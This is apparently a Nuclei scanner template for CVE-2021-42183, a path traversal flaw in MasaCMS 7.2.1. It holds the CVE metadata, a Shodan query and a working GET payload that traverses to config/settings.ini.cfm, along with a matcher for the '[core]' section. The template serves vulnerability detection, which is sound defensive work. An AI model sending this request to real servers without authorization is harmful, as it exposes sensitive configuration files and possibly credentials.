id: CVE-2021-42183

info:
  name: MasaCMS Path Traversal Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: MasaCMS 7.2.1 is affected by a path traversal vulnerability in /index.cfm/_api/asset/image/ allowing reading of sensitive files.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive files and data.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version of MasaCMS to mitigate the path traversal vulnerability.
  reference:
    - https://github.com/0xRaw/CVE-2021-42183
    - https://github.com/MasaCMS/MasaCMS/blob/9bff7989ab902b2c42499bd4d1582e30d1ec4fe9/core/mura/content/file/fileManager.cfc#L368
    - https://github.com/MasaCMS/MasaCMS
    - https://github.com/SYRTI/POC_to_review
    - https://github.com/WhooAmii/POC_to_review
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-42183
    cwe-id: CWE-22
    epss-score: 0.00184
    epss-percentile: 0.56813
    cpe: cpe:2.3:a:masacms:masacms:7.2.1:*:*:*:*:*:*:*
  metadata:
    vendor: masacms
    product: masacms
    shodan-query: 'Generator: Masa CMS'

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.cfm/_api/asset/image/?filePath=/../config/settings.ini.cfm"

    matchers:
      - type: word
        words:
          - "[core]"
        part: body
